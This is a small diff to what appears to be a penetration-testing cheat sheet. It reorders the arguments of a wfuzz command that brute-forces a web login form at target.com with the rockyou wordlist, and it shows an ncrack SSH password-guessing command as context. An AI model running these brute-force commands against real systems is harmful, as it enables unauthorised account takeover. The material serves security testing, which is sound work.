@@ -326,7 +326,7 @@ ncrack -u admin -P common-passwords.txt target.com:22
 Example using **wfuzz** on a **web login form**:
 
 ```
-wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 401 http://target.com/login -d "username=admin&password=FUZZ"
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc=401 -d "username=admin&password=FUZZ" http://target.com/login
 ```
 
 ### Session fixation
